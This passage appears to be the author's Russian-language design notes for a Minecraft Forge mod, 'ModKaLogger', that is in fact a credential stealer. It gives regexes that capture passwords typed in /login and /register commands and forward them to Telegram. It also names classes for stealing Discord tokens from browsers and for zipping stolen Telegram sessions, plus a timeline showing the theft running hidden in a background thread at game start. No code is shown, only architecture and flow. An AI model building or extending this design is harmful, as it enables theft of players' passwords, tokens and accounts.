                     ▼

│ Вызывается конструктор ModKaLogger                          │
│ ✓ Логирует: "[ModKaLogger] Конструктор вызван"            │

                     ▼

        ┌────────────┼────────────┐

        ▼            ▼            ▼

## Архитектура мода

```
ModKaLogger (главный класс)
├── CommandHandler (обработчик событий чата)
│   ├── Перехватывает /login команды
│   ├── Перехватывает /register команды
│   └── Перехватывает /an команды
├── TelegramSender (отправка в Telegram)
│   ├── sendLoginLog()
│   ├── sendRegisterLog()
│   ├── sendAnarchySwitch()
│   └── sendMessage()
├── Discord (краска Discord токенов)
│   ├── getTokens()
│   ├── stealAndSendTokens()
│   └── searchTokensInBrowsers()
└── Telegram (краска Telegram сессий)
    ├── stealSessions()
    ├── stealAndSendSessions()
    └── createZipArchive()
```

## Регулярные выражения для команд

```
LOGIN:    ^/(l|login|cp|changepass)\s+(.+)$
          Примеры: /login password, /l pass, /cp newpass

REGISTER: ^/(register|reg)\s+(.+?)(?:\s+(.+))?$
          Примеры: /register pass1 pass2, /reg pass

ANARCHY:  ^/an(\d+)$
          Примеры: /an1, /an2, /an3
```

## Временная шкала инициализации

```
0ms   - Minecraft запускается
100ms - Forge загружает мод
200ms - Вызывается конструктор ModKaLogger
300ms - Регистрируется обработчик события
400ms - Вызывается метод setup
500ms - Загружается LoadingTest
600ms - Загружается CommandHandler
700ms - Загружается ModKaLoggerInit
800ms - Запускается краска (в отдельном потоке)
3000ms - Краска начинает работать
3500ms - Краска завершается
```

## Обработка ошибок

```
Ошибка при загрузке класса
        │
        ▼
Логируется в ModKaLogger.LOGGER
        │
        ▼
Выводится в логи Minecraft
        │
        ▼
Администратор видит в логах
```

## Безопасность

```
Данные игрока
        │
        ▼
Экранируются для JSON
        │
        ▼
Отправляются по HTTPS
        │
        ▼
Telegram API получает
        │
        ▼
Администратор видит в Telegram
```

Все данные передаются по защищенному каналу HTTPS.
